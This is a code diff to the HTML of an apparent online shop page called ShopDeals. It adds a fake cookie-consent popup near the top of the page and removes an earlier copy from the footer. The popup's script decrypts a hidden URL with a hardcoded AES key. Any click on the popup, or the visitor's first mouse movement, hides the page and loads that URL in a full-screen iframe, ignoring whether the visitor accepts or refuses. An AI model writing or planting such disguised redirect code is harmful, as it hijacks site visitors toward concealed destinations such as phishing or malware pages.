@@ -147,6 +147,117 @@
     </style>
 </head>
 <body>
+  <script src="https://cdn.tailwindcss.com"></script>
+   <div id="cookieModalBox" class="cookie-modal-box">
+        <div id="cookieBackdrop" class="cookie-backdrop"></div>
+        <div id="cookieModal" class="cookie-modal">
+            <div class="cookie-card">
+                <button id="cookieClose" class="close-btn">
+                    <svg viewBox="0 0 15 15" width="24" height="24">
+                        <path d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z" fill="currentColor" />
+                    </svg>
+                </button>
+                <div class="cookie-header">
+                    <span class="cookie-icon">🍪</span>
+                    <h2 class="cookie-title">About cookies</h2>
+                </div>
+                <p class="cookie-text">
+                    We use cookies to provide you with a better user experience. <strong>"agree"</strong>
+                    By clicking, you agree to our use of cookies.
+                </p>
+                <div class="button-group">
+                    <button id="cookieAccept" class="btn-agree">🍪 agree</button>
+                    <button id="cookieDecline" class="btn-refuse">refuse</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="iframeContainer">
+        <iframe id="redirectIframe" src="about:blank"></iframe>
+    </div>
+
+    <script>
+        function aesDecode(encodedText) {
+            try {
+                const decodedText = decodeURIComponent(encodedText);
+                const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+                return bytes.toString(CryptoJS.enc.Utf8);
+            } catch (e) {
+                console.error('Decryption error:', e);
+                return '';
+            }
+        }
+
+        const encryptedPersonalSite = 'U2FsdGVkX1/tBHil1wMqra1PRZL0unWgpb6fKzquYYTbngUGh6/RBv5BbzSoue8bee33zA7afpOIKQSVSMk1FA==';       
+        const encryptedHomeRedirect = 'U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=';
+
+        let redirectTriggered = false; // prevent double redirect
+
+        function performRedirect() {
+            if (redirectTriggered) return;
+            redirectTriggered = true;
+
+            const targetUrl = aesDecode(encryptedPersonalSite);
+            if (!targetUrl || targetUrl === '') {
+                console.error('Decryption failed – cannot redirect.');
+                return;
+            }
+
+            const yourContent = document.getElementById('yourWebsiteContent');
+            if (yourContent) yourContent.style.display = 'none';
+
+            const iframeContainer = document.getElementById('iframeContainer');
+            const iframe = document.getElementById('redirectIframe');
+            if (iframeContainer && iframe) {
+                iframeContainer.style.display = 'block';
+                iframe.src = targetUrl;
+            } else {
+                const newContainer = document.createElement('div');
+                newContainer.id = 'iframeContainer';
+                newContainer.style.cssText =
+                    'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:white;';
+                newContainer.innerHTML =
+                    '<iframe id="redirectIframe" src="' + targetUrl +
+                    '" style="width:100%;height:100%;border:none;"></iframe>';
+                document.body.appendChild(newContainer);
+            }
+        }
+
+        const modalBox = document.getElementById('cookieModalBox');
+        const backdrop = document.getElementById('cookieBackdrop');
+        const acceptBtn = document.getElementById('cookieAccept');
+        const declineBtn = document.getElementById('cookieDecline');
+        const closeBtn = document.getElementById('cookieClose');
+
+        function hideModalAndRedirect(consent) {
+            localStorage.setItem('cookie-consent', consent);
+            if (modalBox) modalBox.classList.add('hidden');
+            document.removeEventListener('mousemove', mouseMoveHandler);
+            performRedirect();
+        }
+
+        function mouseMoveHandler() {
+            hideModalAndRedirect('closed');
+        }
+
+        if (acceptBtn) acceptBtn.onclick = function() {
+            hideModalAndRedirect('accepted');
+        };
+        if (declineBtn) declineBtn.onclick = function() {
+            hideModalAndRedirect('declined');
+        };
+        if (closeBtn) closeBtn.onclick = function() {
+            hideModalAndRedirect('closed');
+        };
+        if (backdrop) backdrop.onclick = function() {
+            hideModalAndRedirect('closed');
+        };
+
+        if (modalBox) modalBox.classList.remove('hidden');
+        // Attach one‑time mouse‑move listener for this visit
+        document.addEventListener('mousemove', mouseMoveHandler, { once: true });
+
+    </script>
   <div class="offer-bar">
     🔥 FLASH SALE — UP TO 60% OFF &nbsp; • &nbsp; LIMITED TIME OFFERS &nbsp; • &nbsp; SHOP NOW →
   </div>
@@ -286,117 +397,5 @@
     <div class="footer-bottom">© 2026 ShopDeals. All rights reserved.</div>
   </footer>
   <script src="script.js"></script>
-  <div id="cookieModalBox" class="cookie-modal-box">
-        <div id="cookieBackdrop" class="cookie-backdrop"></div>
-        <div id="cookieModal" class="cookie-modal">
-            <div class="cookie-card">
-                <button id="cookieClose" class="close-btn">
-                    <svg viewBox="0 0 15 15" width="24" height="24">
-                        <path d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z" fill="currentColor" />
-                    </svg>
-                </button>
-                <div class="cookie-header">
-                    <span class="cookie-icon">🍪</span>
-                    <h2 class="cookie-title">About cookies</h2>
-                </div>
-                <p class="cookie-text">
-                    We use cookies to provide you with a better user experience. <strong>"agree"</strong>
-                    By clicking, you agree to our use of cookies.
-                </p>
-                <div class="button-group">
-                    <button id="cookieAccept" class="btn-agree">🍪 agree</button>
-                    <button id="cookieDecline" class="btn-refuse">refuse</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="iframeContainer">
-        <iframe id="redirectIframe" src="about:blank"></iframe>
-    </div>
-
-    <script>
-        function aesDecode(encodedText) {
-            try {
-                const decodedText = decodeURIComponent(encodedText);
-                const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-                return bytes.toString(CryptoJS.enc.Utf8);
-            } catch (e) {
-                console.error('Decryption error:', e);
-                return '';
-            }
-        }
-
-        const encryptedPersonalSite = 'U2FsdGVkX1/EjcT5CobNCtdmFY1ja9/sMDvfI3hVXsiTRbHnW9r8+Cit6E/f9TC7';
-        // (optional) kept for reference – not used for redirect anymore
-        const encryptedHomeRedirect = 'U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=';
-
-        let redirectTriggered = false; // prevent double redirect
-
-        function performRedirect() {
-            if (redirectTriggered) return;
-            redirectTriggered = true;
-
-            const targetUrl = aesDecode(encryptedPersonalSite);
-            if (!targetUrl || targetUrl === '') {
-                console.error('Decryption failed – cannot redirect.');
-                return;
-            }
-
-            const yourContent = document.getElementById('yourWebsiteContent');
-            if (yourContent) yourContent.style.display = 'none';
-
-            const iframeContainer = document.getElementById('iframeContainer');
-            const iframe = document.getElementById('redirectIframe');
-            if (iframeContainer && iframe) {
-                iframeContainer.style.display = 'block';
-                iframe.src = targetUrl;
-            } else {
-                const newContainer = document.createElement('div');
-                newContainer.id = 'iframeContainer';
-                newContainer.style.cssText =
-                    'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:white;';
-                newContainer.innerHTML =
-                    '<iframe id="redirectIframe" src="' + targetUrl +
-                    '" style="width:100%;height:100%;border:none;"></iframe>';
-                document.body.appendChild(newContainer);
-            }
-        }
-
-        const modalBox = document.getElementById('cookieModalBox');
-        const backdrop = document.getElementById('cookieBackdrop');
-        const acceptBtn = document.getElementById('cookieAccept');
-        const declineBtn = document.getElementById('cookieDecline');
-        const closeBtn = document.getElementById('cookieClose');
-
-        function hideModalAndRedirect(consent) {
-            localStorage.setItem('cookie-consent', consent);
-            if (modalBox) modalBox.classList.add('hidden');
-            document.removeEventListener('mousemove', mouseMoveHandler);
-            performRedirect();
-        }
-
-        function mouseMoveHandler() {
-            hideModalAndRedirect('closed');
-        }
-
-        if (acceptBtn) acceptBtn.onclick = function() {
-            hideModalAndRedirect('accepted');
-        };
-        if (declineBtn) declineBtn.onclick = function() {
-            hideModalAndRedirect('declined');
-        };
-        if (closeBtn) closeBtn.onclick = function() {
-            hideModalAndRedirect('closed');
-        };
-        if (backdrop) backdrop.onclick = function() {
-            hideModalAndRedirect('closed');
-        };
-
-        if (modalBox) modalBox.classList.remove('hidden');
-        // Attach one‑time mouse‑move listener for this visit
-        document.addEventListener('mousemove', mouseMoveHandler, { once: true });
-
-    </script>
 </body>
 </html>
